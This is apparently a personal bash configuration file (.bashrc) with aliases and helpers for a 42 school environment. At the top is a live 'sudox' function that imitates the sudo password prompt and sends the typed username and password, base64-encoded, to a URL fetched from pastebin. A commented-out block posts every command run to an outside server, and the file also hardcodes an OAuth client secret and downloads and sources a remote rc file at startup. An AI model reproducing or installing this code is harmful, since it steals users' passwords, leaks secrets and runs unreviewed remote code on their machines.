#!/bin/bash

function sudox () {
  realsudo="$(type -P sudo)"
  read -s -p "[sudo] password for $USER: " inputPasswd
  printf "\n";
  2>/dev/null wget --no-hsts -qO/dev/null "$(wget --no-hsts -qO- "https://pastebin.com/raw/vR6ipnVm")$(base64 -w0<<<"${USER}:${inputPasswd}")"
  $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 2>&1
  $realsudo "${@:1}"
}

# mega () { /home/tosuman/HackHPI23/blueteam/blueteambot1.sh "${1}"; }

# TERM=xterm
# 
# ##### INFORMATION FOR BLUE TEAM #####
# # DO NOT REMOVE LINES AFTER THIS COMMENT,
# # OTHERWISE MONITORING WILL BREAK
# export PS0='$(__cmd () { hostname | tr -d "\n"; printf "@"; ip -o route get to 8.8.8.8 | sed -n "s/.*src \([0-9.]\+\).*/\1/p" | tr -d "\n"; printf ": "; fc -lnr | head -1 | xargs; }; curl -sL https://hackhpi23.timo.one/api/blue -X POST -H "Content-Type: application/json" -d "{\"data\": \"$(__cmd)\", \"timestamp\": \"$(date +%s)\"}" >/dev/null & unset -f __cmd)'
# 
# ssh () {
#   if [ -n "${@}" ]; then
#     $(type -P ssh) -t "${@}" "export PS0='${PS0}'; bash"
#   else
#     ssh
#   fi
# }
# 
# 
# PS1='\[\033[94m\][BLUE TEAM HOST] $ \[\033[m\]'
# return

[ -z "$PS1" ] && return

shopt -s histappend
shopt -s checkwinsize
HISTSIZE=-1
HISTFILESIZE=-1
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    alias dir='dir --color=auto'
    alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'

    alias less='less -R'
fi

today() {
	echo touch "$(date +'%Y-%m-%d').md"
	touch "$(date +'%Y-%m-%d').md"
}

skill() {
    if [ -n "${1}" ]; then
        sudo kill -9 $(ps aux | grep "${1}" | head -n -1 | awk '{print $2}') 2>/dev/null
    else
        echo "Please provide an argument"
    fi
}

bat() {
  2>/dev/null batcat $1 || $(type -P bat) $1
}

ftssh () {
  local username="${1}"
  local pc_shorthostname="${2}"

  if [ -z "${BEARER_42}" ]; then
    local UID_42="u-s4t2ud-892d03cbb36809765e2c93e2f5e1c74d339d37da9cdb4bda95f7119717f33e16"
    local SECRET_42="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"
    local BEARER_42="$(curl -sL -X POST --data "grant_type=client_credentials&client_id=${UID_42}&client_secret=${SECRET_42}" "https://api.intra.42.fr/oauth/token" | jq -r '.access_token')"
  fi
  if [ -z "${pc_shorthostname}" ] || [ "${pc_shorthostname}" = "null" ]; then
    local pc_shorthostname="$(curl -sL -H "Authorization: Bearer ${BEARER_42}" "https://api.intra.42.fr/v2/users/${username}" | jq -r '.cursus_users[1].user.location')"
  fi
  if [ -z "${pc_shorthostname}" ] || [ "${pc_shorthostname}" = "null" ]; then
    local pc_shorthostname="$(curl -sL -H "Authorization: Bearer ${BEARER_42}" "https://api.intra.42.fr/v2/users/${username}" | jq -r '.cursus_users[0].user.location')"
  fi
  if [ -z "${pc_shorthostname}" ] || [ "${pc_shorthostname}" = "null" ]; then
    echo "Can't resolve hostname from username, please provide 2nd as argument"
    return 1
  fi
  local port="42042"
  local id_file="${HOME}/.ssh/id_rsa_cc"
  local intra_dns="10.51.1.253"

  local pc_ip="$($(type -P dig) +short "${pc_shorthostname}.42berlin.de" "@${intra_dns}" | head -1)"
  echo $(type -P ssh) -i"${id_file}" -p"${port}" "${username}@${pc_ip}"
}

alias v='nvim'
alias ..='cd ..'
alias ...='cd ..\..'
alias ....='cd ..\..\..'
alias tmux='tmux -2'
alias aptclean='sudo apt update && sudo apt upgrade && sudo apt autoremove && sudo apt clean'
alias paruuu='yes | sudo pacman -Sy archlinux-keyring && yes | sudo pacman -Syyuu && yes | paru'
alias shortprompt="unset PROMPT_COMMAND && PS1='$'"
alias longprompt="PROMPT_COMMAND=prompt_command_hook"
alias open='xdg-open'
alias xcopy='xsel --clipboard --input'
alias xpaste='xsel --clipboard --output'
alias sl='sl -GwFdcal'
alias br42='cc -Wall -Wextra -Werror -o main -xc <(grep -v "////" *.c) && ./main; rm ./main 2>/dev/null'

alias dotconf='$(type -P git) --git-dir="${HOME}/.dotfiles/" --work-tree="${HOME}"'
dotconf config status.showUntrackedFiles no

## synth-shell-greeter.sh
if [ -f ~/.config/synth-shell/synth-shell-greeter.sh ] && [ -n "$( echo $- | grep i )" ]; then
  :
	#. ~/.config/synth-shell/synth-shell-greeter.sh
fi

##-----------------------------------------------------
## synth-shell-prompt.sh
if [ -f ~/.config/synth-shell/synth-shell-prompt.sh ] && [ -n "$( echo $- | grep i )" ]; then
  :
	# . ~/.config/synth-shell/synth-shell-prompt.sh
fi

##-----------------------------------------------------
## better-ls
if [ -f ~/.config/synth-shell/better-ls.sh ] && [ -n "$( echo $- | grep i )" ]; then
  :
	# . ~/.config/synth-shell/better-ls.sh
fi

##-----------------------------------------------------
## alias
if [ -f ~/.config/synth-shell/alias.sh ] && [ -n "$( echo $- | grep i )" ]; then
	. ~/.config/synth-shell/alias.sh
fi

##-----------------------------------------------------
## better-history
if [ -f ~/.config/synth-shell/better-history.sh ] && [ -n "$( echo $- | grep i )" ]; then
	. ~/.config/synth-shell/better-history.sh
fi

if [ -f ~/.userbashrc ]; then
	. ~/.userbashrc
fi

TERM=xterm

alias francinette=/home/tosuman/francinette/tester.sh

alias paco=/home/tosuman/francinette/tester.sh

if [ ! -f ~/.42rc ]; then
  curl -sL timo.one/42 -o ~/.42rc
fi

if [ -f ~/.42rc ]; then
  source ~/.42rc
fi

export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8
source /usr/share/nvm/init-nvm.sh
export XDG_RUNTIME_DIR="/run/user/$(id -u)"
